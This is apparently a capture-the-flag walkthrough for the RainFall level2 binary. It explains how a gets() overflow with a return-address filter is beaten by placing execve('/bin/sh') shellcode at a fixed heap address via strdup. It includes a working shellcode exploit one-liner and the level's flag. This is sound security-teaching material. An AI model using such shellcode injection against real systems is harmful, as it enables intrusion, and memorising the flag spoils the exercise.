# level2 — return-address filter → shellcode on the heap

**Teaches:** what to do when you can't return to the stack; using `strdup` to
place your shellcode at a known heap address. Re-read primer §5.

## 1. What the binary does
Reads a line, prints it back, returns.

## 2. Reconstructed C
```c
char *p(void) {
    char buffer[64];
    void *ret;
    fflush(stdout);
    gets(buffer);                          // overflow again
    ret = __builtin_return_address(0);     // the saved return address
    if (((unsigned)ret & 0xb0000000) == 0xb0000000) {   // <-- the filter
        printf("%p\n", ret);
        exit(1);
    }
    puts(buffer);
    return strdup(buffer);                 // copies buffer to the HEAP
}
int main(void) { p(); return 0; }
```

## 3. The vulnerability
`gets()` overflows as in level1. But there is a **check**: the saved return
address must **not** start with the bits `0xb...`. Stack addresses here are
`0xbffff...`, so you cannot return to shellcode on the stack.

The escape: `strdup(buffer)` copies your input to the heap at a **fixed,
non-`0xb` address** (`0x0804a008`). Put shellcode in your input → a copy lands on
the heap → return there.

## 4. Memory map
```
STACK:  [ buffer(64) ][ ... ][ saved EIP ]   <- can't point here (0xbf... blocked)
HEAP :  0x0804a008: [ copy of your input, including the shellcode ]  <- point here
```

## 5. Step by step
1. `disassemble p` → see `gets`, the `and eax,0xb0000000` / `cmp` filter, and `strdup`.
2. Confirm the heap address `strdup` returns:
   ```
   level2@RainFall:~$ ltrace ./level2
   strdup("") = 0x0804a008
   ```
3. Offset to EIP via pattern = **80**.
4. Shellcode = a 21-byte `execve("/bin/sh")` (e.g. shell-storm #575).

## 6. Exploit
```
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"' > /tmp/exploit
cat /tmp/exploit - | ./level2
```
Layout = `shellcode (21) + pad (59) = 80 bytes`, then the heap address
`0x0804a008`. With `tools/payload.py`: offset `80`, address `0x0804a008`,
shellcode = the hex bytes.

**Why it works:** `ret` gets overwritten with `0x0804a008` (passes the `0xb`
filter), where `strdup` placed a copy of your shellcode. Execution jumps into it.

Flag → `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
